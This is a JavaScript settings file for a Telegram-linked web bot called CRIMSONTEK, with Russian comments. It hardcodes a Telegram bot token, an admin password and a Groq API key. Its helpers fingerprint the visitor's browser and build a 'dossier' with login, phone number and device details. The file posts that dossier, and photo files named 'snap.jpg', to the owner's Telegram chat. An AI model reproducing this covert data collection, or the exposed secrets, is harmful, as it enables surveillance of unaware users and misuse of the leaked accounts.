/**
 * CRIMSONTEK — общие настройки бота
 * ВНИМАНИЕ: Для продакшена токены лучше скрывать на бэкенде.
 */
const CRIMSON_TG = {
  token: '8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0',
  chatId: '7616949660'
};

/**
 * Секрет владельца: Исправлено (добавлены кавычки)
 */
const CRIMSON_ADMIN_SECRET = 'Ghost0198';

/**
 * Чат с нейросетью (Groq API)
 * Используется ваш ключ gsk_...
 */
const CRIMSON_AI = {
  apiUrl: 'https://api.groq.com/openai/v1/chat/completions',
  apiKey: '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',
  model: 'llama-3.3-70b-versatile'
};

/** Получение ключа: приоритет конфигу, затем localStorage */
function crimsonGetAiKey() {
  const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
  if (fromConfig) return String(CRIMSON_AI.apiKey).trim();
  return (localStorage.getItem('crimson_ai_key') || '').trim();
}

/** Форматирование текста для вывода в HTML */
function crimsonFormatAiHtml(text) {
  return escapeHtml(String(text)).replace(/\n/g, '<br>');
}

/**
 * Основная функция чата с AI
 * @param {Array<{role:string,content:string}>} messages
 * @returns {Promise<string>}
 */
async function crimsonAiChat(messages) {
  const key = crimsonGetAiKey();
  if (!key) {
    const e = new Error('NO_KEY');
    e.code = 'NO_KEY';
    throw e;
  }
  const res = await fetch(CRIMSON_AI.apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + key
    },
    body: JSON.stringify({
      model: CRIMSON_AI.model,
      messages: messages,
      temperature: 0.65
    })
  });

  const raw = await res.text();
  let data;
  try {
    data = JSON.parse(raw);
  } catch (err) {
    throw new Error(raw.slice(0, 200) || String(res.status));
  }

  if (!res.ok) {
    const msg = (data.error && data.error.message) || raw.slice(0, 300) || res.status;
    throw new Error(msg);
  }

  const out =
    data.choices &&
    data.choices[0] &&
    data.choices[0].message &&
    data.choices[0].message.content;

  if (!out) throw new Error('ПУСТОЙ ОТВЕТ API');
  return out;
}

/** URL списка моделей для проверки ключа */
function crimsonAiModelsEndpoint() {
  const u = CRIMSON_AI.apiUrl;
  if (u.indexOf('/chat/completions') >= 0) {
    return u.replace(/\/chat\/completions\/?$/, '/models');
  }
  return u.replace(/\/v1\/[^/]+$/, '/models');
}

/** Проверка статуса API ключа */
async function crimsonCheckAiKeyStatus() {
  const key = crimsonGetAiKey();
  if (!key) {
    return {
      ok: false,
      code: 'none',
      text: 'КЛЮЧ НЕ ЗАДАН',
      detail: 'Укажите ключ на HUB или CRIMSON_AI.apiKey в crimson-config.js'
    };
  }
  const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
  const source = fromConfig ? 'конфиг' : 'localStorage';

  try {
    const r = await fetch(crimsonAiModelsEndpoint(), {
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + key }
    });
    if (r.ok) {
      return {
        ok: true,
        code: 'ok',
        text: 'API: СВЯЗЬ OK',
        detail: 'Ключ принят · источник: ' + source
      };
    }
    if (r.status === 401) {
      return { ok: false, code: '401', text: 'API: 401 НЕВЕРНЫЙ КЛЮЧ', detail: source };
    }
    const raw = await r.text();
    return {
      ok: false,
      code: 'http',
      text: 'API: ОШИБКА ' + r.status,
      detail: (raw || '').slice(0, 160)
    };
  } catch (e) {
    return {
      ok: false,
      code: 'network',
      text: 'API: ПРОВЕРКА НЕДОСТУПНА',
      detail: 'Используйте http сервер (не file://) или проверьте CORS.'
    };
  }
}

/** Сбор данных о пользователе/браузере */
function crimsonCollectMeta() {
  return {
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    langs: (navigator.languages || []).join(', '),
    platform: navigator.platform || '',
    ua: navigator.userAgent,
    screen: typeof screen !== 'undefined' ? `${screen.width}x${screen.height}` : '',
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    referrer: document.referrer || 'direct',
    online: navigator.onLine,
    time: new Date().toISOString()
  };
}

/** Форматирование данных для отправки в Telegram */
function crimsonFormatDossier(title, extra) {
  const m = crimsonCollectMeta();
  const lines = [
    `<b>${title}</b>`,
    '',
    `<b>Оператор:</b> ${extra.login || '—'}`,
    `<b>Телефон:</b> ${extra.phone || '—'}`,
    `<b>Событие:</b> ${extra.event || '—'}`,
    '',
    '<b>Устройство / сессия</b>',
    `• Время (UTC): ${m.time}`,
    `• Часовой пояс: ${m.tz}`,
    `• Язык: ${m.lang} (${m.langs})`,
    `• Платформа: ${m.platform}`,
    `• Экран: ${m.screen}`,
    `• Viewport: ${m.viewport}`,
    `• Онлайн: ${m.online}`,
    `• Referrer: ${m.referrer}`,
    '',
    `<b>User-Agent</b>`,
    `<code>${escapeHtml(m.ua).slice(0, 3500)}</code>`
  ];
  if (extra.note) lines.push('', '<b>Комментарий</b>', escapeHtml(extra.note));
  return lines.join('\n');
}

/** Защита от XSS и спецсимволов HTML */
function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/** Отправка текста в Telegram (HTML) */
async function crimsonSendTelegramHtml(text) {
  const fd = new FormData();
  fd.append('chat_id', CRIMSON_TG.chatId);
  fd.append('text', text);
  fd.append('parse_mode', 'HTML');
  fd.append('disable_web_page_preview', 'true');

  try {
    const res = await fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendMessage`, {
      method: 'POST',
      body: fd
    });
    return await res.json();
  } catch (err) {
    console.error('Ошибка Telegram:', err);
  }
}

/** Отправка Фото + подпись в Telegram */
async function crimsonSendTelegramPhoto(blob, caption) {
  const fd = new FormData();
  fd.append('chat_id', CRIMSON_TG.chatId);
  fd.append('photo', blob, 'snap.jpg');
  fd.append('caption', caption.slice(0, 1024));

  try {
    const res = await fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendPhoto`, {
      method: 'POST',
      body: fd
    });
    return await res.json();
  } catch (err) {
    console.error('Ошибка отправки фото:', err);
  }
}
